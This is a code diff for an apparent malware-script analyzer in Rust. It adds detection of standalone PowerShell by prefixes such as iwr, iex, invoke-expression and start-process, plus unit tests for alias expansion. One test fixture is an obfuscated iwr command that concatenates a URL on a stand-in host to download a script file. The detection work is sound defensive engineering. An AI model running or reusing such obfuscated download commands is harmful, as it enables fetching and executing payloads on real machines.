@@ -6615,7 +6615,28 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || (first.starts_with("function ") && lower.contains("end function"))
 }
 
+fn starts_like_standalone_powershell(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with('$')
+        || first.starts_with('&')
+        || first.starts_with("iwr ")
+        || first.starts_with("irm ")
+        || first.starts_with("iex ")
+        || first.starts_with("invoke-webrequest ")
+        || first.starts_with("invoke-restmethod ")
+        || first.starts_with("invoke-expression ")
+        || first.starts_with("new-object ")
+        || first.starts_with("start-process ")
+}
+
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if starts_like_standalone_powershell(&lower) && crate::ps_alias::looks_like_powershell(&text) {
+        push_unique_payload(&mut env.all_extracted_ps1, text.as_bytes().to_vec());
+        return true;
+    }
+
     let has_vbs_atom = contains_ascii_case_insensitive_bytes(input, b"createobject")
         || contains_ascii_case_insensitive_bytes(input, b"wscript")
         || contains_ascii_case_insensitive_bytes(input, b"xmlhttp")
@@ -6624,8 +6645,6 @@ fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool
         return false;
     }
 
-    let text = String::from_utf8_lossy(input);
-    let lower = text.to_ascii_lowercase();
     if starts_like_standalone_vbs(&lower) && looks_like_vbs_script(&lower) {
         push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
         return true;
@@ -34078,6 +34097,61 @@ mod ps_alias_tests {
             out.contains("Write-Output $line"),
             "echo alias missed: {}",
             out
+        );
+    }
+
+    #[test]
+    fn aliases_inside_long_quoted_literals_are_not_expanded() {
+        let input = "$ua = 'Mozilla/5.0 Firefox/150.0 rv:150.0'; rv $ua";
+        let out = expand_aliases(input);
+
+        assert!(
+            out.contains("Firefox/150.0 rv:150.0"),
+            "alias expansion rewrote quoted user-agent text: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+
+        let unquoted_colon = "$ua = rv:150.0; rv $ua";
+        let out = expand_aliases(unquoted_colon);
+        assert!(
+            out.contains("rv:150.0"),
+            "alias expansion rewrote colon-suffixed token: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+    }
+}
+
+#[cfg(test)]
+mod standalone_powershell_input_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn alias_starting_obfuscated_iwr_script_gets_structured_download() {
+        let script = br#"iwr ('ht' + 'tps://standalone-iwr-concat.example/a.ps1') -OutFile a.ps1"#;
+
+        let report = analyze(script.as_slice(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://standalone-iwr-concat.example/a.ps1"
+                        && dst.as_deref() == Some("a.ps1")
+            )),
+            "alias-starting standalone PS was not structured as a download: {:?}\ndeob:\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 }
